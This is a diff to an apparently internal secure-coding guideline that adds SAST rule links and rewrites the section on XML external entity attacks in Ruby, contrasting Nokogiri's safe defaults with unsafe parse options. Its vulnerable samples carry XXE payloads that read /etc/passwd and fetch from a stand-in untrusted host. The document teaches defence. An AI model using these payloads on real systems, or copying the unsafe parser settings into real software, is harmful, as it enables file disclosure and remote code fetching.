@@ -21,7 +21,7 @@ For each of the vulnerabilities listed in this document, AppSec aims to have a S
 | [JWT](#json-web-tokens-jwt) | Pending | ❌ |
 | [SSRF](#server-side-request-forgery-ssrf) | [1](https://gitlab.com/gitlab-com/gl-security/product-security/appsec/sast-custom-rules/-/blob/main/secure-coding-guidelines/ruby/ruby_insecure_url-1.yml), [2](https://gitlab.com/gitlab-com/gl-security/product-security/appsec/sast-custom-rules/-/blob/main/secure-coding-guidelines/ruby/ruby_insecure_http.yml?ref_type=heads)  | ✅ |
 | [XSS](#xss-guidelines) | [1](https://gitlab.com/gitlab-com/gl-security/product-security/appsec/sast-custom-rules/-/blob/main/secure-coding-guidelines/ruby/ruby_xss_redirect.yml), [2](https://gitlab.com/gitlab-com/gl-security/product-security/appsec/sast-custom-rules/-/blob/main/secure-coding-guidelines/ruby/ruby_xss_html_safe.yml)  | ✅ |
-| [XXE](#xml-external-entities) | Pending | ❌ |
+| [XXE](#xml-external-entities) | [1](https://gitlab.com/gitlab-com/gl-security/product-security/appsec/sast-custom-rules/-/blob/main/secure-coding-guidelines/ruby/ruby_xml_injection_change_unsafe_nokogiri_parse_option.yml?ref_type=heads), [2](https://gitlab.com/gitlab-com/gl-security/product-security/appsec/sast-custom-rules/-/blob/main/secure-coding-guidelines/ruby/ruby_xml_injection_initialize_unsafe_nokogiri_parse_option.yml?ref_type=heads), [3](https://gitlab.com/gitlab-com/gl-security/product-security/appsec/sast-custom-rules/-/blob/main/secure-coding-guidelines/ruby/ruby_xml_injection_set_unsafe_nokogiri_parse_option.yml?ref_type=heads), [4](https://gitlab.com/gitlab-com/gl-security/product-security/appsec/sast-custom-rules/-/blob/main/secure-coding-guidelines/ruby/ruby_xml_injection_unsafe_xml_libraries.yml?ref_type=heads)  | ✅ |
 | [Path traversal](#path-traversal-guidelines) (Ruby) | [1](https://gitlab.com/gitlab-com/gl-security/product-security/appsec/sast-custom-rules/-/blob/main/secure-coding-guidelines/ruby/ruby_path_traversal.yml?ref_type=heads) | ✅ |
 | [Path traversal](#path-traversal-guidelines) (Go) | [1](https://gitlab.com/gitlab-com/gl-security/product-security/appsec/sast-custom-rules/-/merge_requests/39)  | ✅ |
 | [OS command injection](#os-command-injection-guidelines) (Ruby) | [1](https://gitlab.com/gitlab-com/gl-security/product-security/appsec/sast-custom-rules/-/blob/main/secure-coding-guidelines/ruby/ruby_command_injection.yml?ref_type=heads) | ✅ |
@@ -689,7 +689,31 @@ References:
 
 XML external entity (XXE) injection is a type of attack against an application that parses XML input. This attack occurs when XML input containing a reference to an external entity is processed by a weakly configured XML parser. It can lead to disclosure of confidential data, denial of service, server-side request forgery, port scanning from the perspective of the machine where the parser is located, and other system impacts.
 
-### Example
+### XXE mitigation in Ruby
+
+The two main ways we can prevent XXE vulnerabilities in our codebase are:
+
+Use a safe XML parser: We prefer using Nokogiri when coding in Ruby. Nokogiri is a great option because it provides secure defaults that protect against XXE attacks. For more information, see the [Nokogiri documentation on parsing an HTML / XML Document](https://nokogiri.org/tutorials/parsing_an_html_xml_document.html#parse-options).
+
+When using Nokogiri, be sure to use the default or safe parsing settings, especially when working with unsanitized user input. Do not use the following unsafe Nokogiri settings ⚠️:
+
+| Setting | Description |
+| ------ | ------ |
+| `dtdload` | Tries to validate DTD validity of the object which is unsafe when working with unsanitized user input. |
+| `huge` | Unsets maximum size/depth of objects that could be used for denial of service. |
+| `nononet` | Allows network connections. |
+| `noent` | Allows the expansion of XML entities and could result in arbitrary file reads. |
+
+### Safe XML Library
+
+```ruby
+require 'nokogiri'
+
+# Safe by default
+doc = Nokogiri::XML(xml_string)
+```
+
+### Unsafe XML Library, file system leak
 
 ```ruby
 require 'rexml/document'
@@ -705,19 +729,93 @@ EOX
 
 # Parsing XML without proper safeguards
 doc = REXML::Document.new(xml)
-puts doc.root.text  # This could output the contents of /etc/passwd
+puts doc.root.text
+# This could output /etc/passwd
 ```
 
-### XXE mitigation in Ruby
-
-Use a safe XML parser: We prefer using Nokogiri when coding in Ruby. Nokogiri is a great option because it provides secure defaults that protect against XXE attacks. For more information, see the [Nokogiri documentation on parsing an HTML / XML Document](https://nokogiri.org/tutorials/parsing_an_html_xml_document.html#parse-options).
+### Noent unsafe setting initialized, potential file system leak
 
 ```ruby
 require 'nokogiri'
 
-# Safe by default
-doc = Nokogiri::XML(xml_string)
+# Vulnerable code
+xml = <<-EOX
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [
+  <!ELEMENT foo ANY >
+  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+<foo>&xxe;</foo>
+EOX
+
+# noent substitutes entities, unsafe when parsing XML
+po = Nokogiri::XML::ParseOptions.new.huge.noent
+doc = Nokogiri::XML::Document.parse(xml, nil, nil, po)
+puts doc.root.text  # This will output the contents of /etc/passwd
+
+##
+# User Database
+#
+# Note that this file is consulted directly only when the system is running
+...
 ```
+
+### Nononet unsafe setting initialized, potential malware execution
+
+```ruby
+require 'nokogiri'
+
+# Vulnerable code
+xml = <<-EOX
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [
+  <!ELEMENT foo ANY >
+  <!ENTITY xxe SYSTEM "http://untrustedhost.example.com/maliciousCode" >]>
+<foo>&xxe;</foo>
+EOX
+
+# In this example we use `ParseOptions` but select insecure options.
+# NONONET allows network connections while parsing which is unsafe, as is DTDLOAD!
+options = Nokogiri::XML::ParseOptions.new(Nokogiri::XML::ParseOptions::NONONET, Nokogiri::XML::ParseOptions::DTDLOAD)
+
+# Parsing the xml above would allow `untrustedhost` to run arbitrary code on our server.
+# See the "Impact" section for more.
+doc = Nokogiri::XML::Document.parse(xml, nil, nil, options)
+```
+
+### Noent unsafe setting set, potential file system leak
+
+```ruby
+require 'nokogiri'
+
+# Vulnerable code
+xml = <<-EOX
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [
+  <!ELEMENT foo ANY >
+  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+<foo>&xxe;</foo>
+EOX
+
+# setting options may also look like this, NONET disallows network connections while parsing safe
+options = Nokogiri::XML::ParseOptions::NOENT | Nokogiri::XML::ParseOptions::NONET
+
+doc = Nokogiri::XML(xml, nil, nil, options) do |config|
+  config.nononet  # Allows network access
+  config.noent  # Enables entity expansion
+  config.dtdload # Enables DTD loading
+end
+
+puts doc.to_xml
+# This could output the contents of /etc/passwd
+```
+
+### Impact
+
+XXE attacks can lead to multiple critical and high severity issues, like arbitrary file read, remote code execution, or information disclosure.
+
+### When to consider
+
+When working with XML parsing, particularly with user-controlled inputs.
 
 ## Path Traversal guidelines
 
